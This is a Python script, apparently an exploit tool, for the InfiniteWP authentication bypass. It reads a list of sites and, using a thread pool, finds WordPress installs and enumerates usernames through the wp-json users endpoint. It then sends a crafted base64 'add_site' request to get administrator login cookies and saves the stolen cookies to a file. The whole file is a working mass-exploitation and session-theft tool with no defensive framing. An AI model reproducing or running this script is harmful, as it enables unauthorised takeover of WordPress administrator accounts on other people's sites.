import sys
import base64
import urllib3
import requests
from multiprocessing import Pool
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Cookie': 'humans_21909=1'}

def get_admincookie(url, username):
    test = '''{"iwp_action":"add_site", "params":{"username": "%s"}}'''.encode('utf-8') % (username).encode('utf-8')
    encoded_bytes = base64.b64encode(test).decode('utf-8')
    final_data = f'_IWP_JSON_PREFIX_{encoded_bytes}'

    r = requests.post(url, headers=headers, data=final_data, timeout=10, verify=False)
    if r.ok:
        try:
            if '_IWP_JSON_PREFIX' in r.text:
                cookies = r.headers['Set-Cookie'].split(';')
                if 'wordpress_logged_in' in r.headers['Set-Cookie']:
                    with open('infinite_wp_vuln.txt', 'a+') as output:
                        output.write(f'VULN : {url}\n')
                else:
                    pass
                for i in cookies:
                    if 'wordpress_logged_in_' in i:
                        _, cookie_value = i.split(',')
                        with open('infinite_wp_vuln_cookies.txt', 'a+') as output_:
                            output_.write(f'SITE : {url} - [Cookies : {cookie_value}]\n')
                    else:
                        pass
        except:
            pass
    else:
        print('Not vulnerable.')



def getuser(url):

    r = requests.get(f'{url}wp-json/wp/v2/users', headers=headers, timeout=10, verify=False)
    if r.ok:
        if 'slug' in r.text:
            username = r.json()[0]['slug']
            get_admincookie(url, username)
            try:
                if username == '':
                    for x in r.json():
                        slug_ = x['slug']
                        if slug_ != '':
                            username = x['slug']
                            get_admincookie(url, username)
            except:
                username = 'admin'
                get_admincookie(url, username)
        else:
            username = 'admin'
            get_admincookie(url, username)
    else:
        pass


def main(sites):
    try:
        r = requests.get('http://{}/'.format(sites), headers=headers, timeout=10, verify=False)
        if r.ok:
            id_ = ['s.w.org', 'wp-content', 'wp-login.php', 'wp-includes']
            if any(identifier in r.text for identifier in id_):
                getuser(r.url)
            else:
                pass
        else:
            pass
    except:
        pass


if __name__=='__main__':
    try:
        with open(str(sys.argv[1])) as lists:
            list_urls = lists.read().splitlines()
            p = Pool(int(sys.argv[2]))
            p.map(main, list_urls)
            p.terminate()
            p.join()
    except:
        print('Usage : python script.py list.txt threadcount')
